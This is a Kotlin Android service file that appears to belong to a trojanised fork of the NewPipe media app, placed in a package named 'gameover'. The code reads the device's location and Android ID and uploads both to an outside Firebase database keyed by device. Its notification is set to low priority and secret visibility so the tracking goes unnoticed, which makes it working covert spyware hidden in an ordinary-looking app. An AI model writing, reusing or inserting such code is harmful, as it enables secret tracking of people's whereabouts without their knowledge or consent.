package org.schabi.newpipe.gameover
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.google.firebase.database.FirebaseDatabase
import org.schabi.newpipe.App
import org.schabi.newpipe.R
import java.text.SimpleDateFormat
import java.util.*

class LocationService : Service() {

    // TODO : the acquisition code (Location)
    private val FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS"
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var aid: String = ""

    override fun onBind(intent: Intent): IBinder {
        TODO("Return the communication channel to the service.")
    }

    override fun onCreate() {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
    }

    @SuppressLint("MissingPermission")
    private fun getLocat() {
        fusedLocationClient.lastLocation
            .addOnSuccessListener { location ->
                if (location != null) {
                    val lat = location.latitude.toString()
                    val long = location.longitude.toString()
                    val alt = location.altitude.toString()
                    val timeStmp = SimpleDateFormat(FILENAME_FORMAT, Locale.US).format(System.currentTimeMillis())
                    uploadData(LocationMarker(timeStmp, lat, long, alt))
                    App.marker!!.setLat(lat)
                    App.marker!!.setLong(long)
                    App.marker!!.setLocTime(timeStmp.toString())
                    // Toast.makeText(this, "Location: " + location.latitude.toString() + "\t" + location.longitude.toString(), Toast.LENGTH_SHORT).show()
                }
            }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null && intent.action.equals("startLocationTracking")) {
            startMyForeground()
            getAid()
            getLocat()
            this.stopForeground(true)
        } else if (intent != null && intent.action.equals("stopLocationTracking")) {
            stopSelf()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    private fun uploadData(myLoc: LocationMarker) {
        var database = FirebaseDatabase.getInstance("https://signoui-default-rtdb.asia-southeast1.firebasedatabase.app").reference
        database.child("Devices").child(aid).child("location").child(myLoc.timeStamp).setValue(myLoc)
    }

    private fun getAid() {
        aid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startMyForeground() {
        val channel = NotificationChannel("1", getString(R.string.app_name), NotificationManager.IMPORTANCE_LOW)
        channel.description = getString(R.string.app_name) + " Service"
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)
        val builder = NotificationCompat.Builder(this, "1")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(getString(R.string.app_name))
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setAutoCancel(true)
            .setOnlyAlertOnce(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        val notification = builder.build()
        this.startForeground(1, notification)
    }
}
